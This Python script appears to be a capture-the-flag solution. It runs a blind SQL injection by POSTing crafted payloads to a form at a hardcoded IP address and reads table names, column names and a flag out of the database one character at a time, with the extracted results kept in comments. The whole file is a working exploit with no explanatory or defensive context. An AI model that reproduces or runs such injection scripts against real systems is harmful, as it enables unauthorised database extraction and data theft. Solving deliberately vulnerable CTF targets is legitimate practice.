#!/usr/bin/env python3

import requests

def blind_content():
    print('--START ATTACKING--')

    url = "http://202.125.94.123:2088/blind/"
    id=1
    out = ''
    while True:
        for x in range(32, 126):
            # GET TABLE
            payload = f"123' and ascii(substring((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database()),{id},1)) = '{x}' -- -"
            # flag_123,lulus
            
            # GET COLOUMN
            payload = f"123' and ascii(substring((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flag_123'),{id},1)) = '{x}' -- -"
            # flag_321
            
            # GET FLAGGG
            payload = f"123' and ascii(substring((SELECT GROUP_CONCAT(flag_321) FROM flag_123),{id},1)) = '{x}' -- -"
            # hackfest0x4{S3L4M4T_AnD4_LU7U5_17623}

            data = {"cek" : payload,
                    "submit" : "_Ch3K"}
            
            output = requests.post(url, data = data)
            #print(payload)
            if "Selamat Kamu dinyatakan LULUS" in output.text:
                id += 1
                out += chr(x)
                print(out)
                break

if __name__ == ("__main__"):
    blind_content()